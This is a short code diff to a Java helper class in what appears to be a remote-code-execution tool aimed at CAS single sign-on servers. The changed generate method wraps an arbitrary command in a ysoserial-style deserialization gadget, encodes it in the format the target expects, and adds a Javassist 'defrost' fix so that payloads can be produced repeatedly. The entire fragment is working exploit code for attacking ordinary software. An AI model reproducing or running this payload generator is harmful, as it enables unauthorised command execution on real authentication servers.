@@ -52,6 +52,11 @@ public class CasCommonUtils {
 
     public static String generate(String className, String command){
         try {
+            // 解决: java.lang.RuntimeException: StubTransletPayload: frozen class (cannot edit) 错误
+            try{
+                javassist.ClassPool.getDefault().getCtClass("StubTransletPayload").defrost();
+            }catch (javassist.NotFoundException e){
+            }
             Object o = ObjectPayload.Utils.makePayloadObject(className, command);
             //EncryptedTranscoder transcoder = new EncryptedTranscoder();
             //byte[] aesEncoded = transcoder.encode(o);
@@ -60,7 +65,7 @@ public class CasCommonUtils {
             String output = "67554b79-6cc1-4d89-a933-e99eb21a0ac2_"+b64Encoded;
             return URLEncoder.encode(output);
         }catch (Exception e){
-            CasPayloadGenerate.iResultOutput.errorPrintln(e.getMessage());
+            CasPayloadGenerate.iResultOutput.errorPrintln(CasRCE.pluginHelper.getThrowableInfo(e));
             return e.getMessage();
         }
     }
